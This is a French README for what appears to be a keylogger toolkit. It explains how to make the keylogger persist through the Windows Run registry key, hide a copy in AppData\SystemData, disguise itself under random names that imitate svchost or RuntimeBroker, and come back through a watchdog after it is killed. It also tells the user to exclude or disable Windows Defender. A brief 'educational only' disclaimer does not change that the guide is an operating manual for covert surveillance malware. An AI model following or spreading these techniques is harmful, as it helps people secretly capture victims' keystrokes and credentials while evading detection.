# 🔄 Guide de Persistence et Auto-Redémarrage

Ce guide explique comment utiliser les fonctionnalités de persistence et d'auto-redémarrage.

## 🎯 Fonctionnalités

### 1. Persistence au Démarrage
- ✅ **Auto-start au démarrage de Windows**
- ✅ **Installation automatique dans le registre**
- ✅ **Copie cachée dans AppData\SystemData**
- ✅ **Nom de processus aléatoire**

### 2. Auto-Redémarrage
- ✅ **Redémarre automatiquement si le processus est tué**
- ✅ **Génère un nouveau nom aléatoire à chaque redémarrage**
- ✅ **Surveille en permanence**
- ✅ **Redémarrages illimités**

### 3. Noms de Processus Aléatoires
- ✅ **Imite les vrais processus Windows** (svchost, RuntimeBroker, etc.)
- ✅ **Nouveau nom à chaque installation/redémarrage**
- ✅ **Difficile à détecter dans le Gestionnaire de tâches**

## 📋 Configuration

### Dans le Builder

Lors de la compilation avec `builder_advanced.py`, la persistence est **automatiquement activée**.

### Configuration Manuelle

Éditez `src/windows/keylogger_windows_advanced.py` :

```python
# Persistence activée par défaut
ENABLE_PERSISTENCE = True  # ✅ Activé

# Noms aléatoires activés
USE_RANDOM_NAMES = True    # ✅ Activé
```

## 🚀 Utilisation

### Option 1 : Avec Watchdog (Recommandé)

Le watchdog garantit que le keylogger redémarre toujours, même s'il est tué.

**Étapes :**

1. **Builder le projet**
   ```powershell
   python tools/builder_advanced.py
   ```

2. **Compiler le watchdog** (si pas déjà compilé)
   ```powershell
   pyinstaller --onefile --noconsole src/windows/watchdog_launcher.py
   ```

3. **Lancer le watchdog**
   ```powershell
   dist/watchdog_launcher.exe
   ```

**Ce qui se passe :**
- Le watchdog se lance
- Il installe la persistence pour lui-même
- Il lance le keylogger avec un nom aléatoire
- Si le keylogger est tué, le watchdog le relance avec un nouveau nom
- Si le PC redémarre, le watchdog se relance automatiquement

### Option 2 : Sans Watchdog (Persistence Simple)

Le keylogger s'installe pour démarrer au boot, mais ne redémarre pas automatiquement s'il est tué.

**Étapes :**

1. **Builder le projet**
   ```powershell
   python tools/builder_advanced.py
   ```

2. **Lancer l'exécutable**
   ```powershell
   build/dist/[nom].exe
   ```

**Ce qui se passe :**
- Le keylogger s'installe dans le registre
- Se copie dans `AppData\SystemData` avec un nom aléatoire
- Redémarre automatiquement au prochain boot
- Mais ne redémarre PAS s'il est tué manuellement

## 🔍 Vérification

### Vérifier la Persistence

**1. Registre Windows**
```powershell
# Ouvrir l'éditeur de registre
regedit

# Aller à :
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

# Chercher une entrée avec un nom comme :
# - svchost
# - RuntimeBroker
# - SystemService
# etc.
```

**2. Dossier Caché**
```powershell
# Ouvrir l'explorateur de fichiers
# Aller à :
%APPDATA%\SystemData

# Si le dossier est caché, activer "Afficher les fichiers cachés"
```

**3. Gestionnaire de Tâches**
```powershell
# Ouvrir le Gestionnaire de tâches (Ctrl+Shift+Esc)
# Onglet "Détails"
# Chercher des processus avec les noms générés
```

## ⚙️ Noms de Processus Générés

Le système génère des noms qui imitent les vrais processus Windows :

### Noms de Processus Communs
- `svchost` (avec ou sans numéro : svchost, svchost42)
- `csrss`
- `RuntimeBroker`
- `SearchApp`
- `SystemSettings`
- `WindowsUpdate`
- `SecurityHealthService`
- `explorer`
- `dwm`
- `conhost`

### Noms Générés
- `SystemService`
- `WindowsHost`
- `MicrosoftManager`
- `RuntimeHelper`
- `ServiceHandler`
- `UpdateProcess`
- etc.

## 🛡️ Désactivation

### Pour Désactiver la Persistence

**Avant Compilation :**
```python
# Dans keylogger_windows_advanced.py
ENABLE_PERSISTENCE = False
```

**Après Installation :**
1. Supprimer l'entrée du registre
   ```powershell
   # Dans regedit, aller à :
   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
   # Supprimer l'entrée avec le nom du processus
   ```

2. Supprimer le fichier caché
   ```powershell
   # Supprimer le dossier
   rmdir /s /q "%APPDATA%\SystemData"
   ```

### Pour Désactiver les Noms Aléatoires

```python
# Dans keylogger_windows_advanced.py
USE_RANDOM_NAMES = False
```

## 📊 Comparaison des Options

| Feature | Sans Watchdog | Avec Watchdog |
|---------|--------------|---------------|
| Démarre au boot | ✅ | ✅ |
| Noms aléatoires | ✅ | ✅ |
| Redémarre si tué | ❌ | ✅ |
| Changement de nom à chaque redémarrage | ❌ | ✅ |
| Surveillance continue | ❌ | ✅ |
| Redémarrages illimités | ❌ | ✅ |

## ⚠️ Avertissements

### Légal
- **Utilisez uniquement sur des systèmes que vous possédez**
- **Obtenez une autorisation écrite explicite**
- **À des fins éducatives et de test uniquement**

### Technique
- La persistence peut être détectée par les antivirus
- Windows Defender peut bloquer l'exécution
- Ajoutez des exceptions dans l'antivirus pour les tests
- **Testez d'abord dans une machine virtuelle**

### Désinstallation
- Gardez une trace de où le programme s'installe
- Documentez les noms de processus générés
- Sauvegardez les chemins d'installation

## 🔧 Dépannage

### La Persistence Ne Fonctionne Pas

**Vérifiez :**
1. Droits d'administration (pas nécessaire mais aide)
2. Antivirus désactivé ou exception ajoutée
3. L'exécutable est bien compilé (pas un script Python)

**Solution :**
```powershell
# Vérifier les logs de Windows
eventvwr.msc
# Aller à : Windows Logs > Application
```

### Le Watchdog Ne Redémarre Pas

**Vérifiez :**
1. Le watchdog est bien lancé
2. Pas bloqué par l'antivirus
3. Le fichier principal existe

**Test :**
```powershell
# Tuer le processus manuellement
taskkill /F /IM [nom_processus].exe

# Observer dans le Gestionnaire de tâches
# Un nouveau processus devrait apparaître dans 5 secondes
```

### Processus Bloqué par Windows Defender

**Solutions :**
1. Ajouter une exception dans Windows Defender
   - Paramètres > Mise à jour et sécurité > Sécurité Windows
   - Protection contre les virus et menaces
   - Gérer les paramètres
   - Exclusions > Ajouter une exclusion
   - Ajouter le dossier `build/`

2. Désactiver temporairement Windows Defender (tests uniquement)

3. Utiliser une VM sans antivirus

## 📝 Notes

- Le watchdog et le keylogger sont deux exécutables séparés
- Le watchdog surveille le keylogger
- Le watchdog lui-même n'a pas besoin d'être surveillé (il s'auto-installe)
- Chaque redémarrage génère un nouveau nom de processus
- Les anciens fichiers sont automatiquement nettoyés

---

**Pour toute question ou problème, vérifiez la documentation complète dans [ADVANCED_FEATURES.md](ADVANCED_FEATURES.md)**
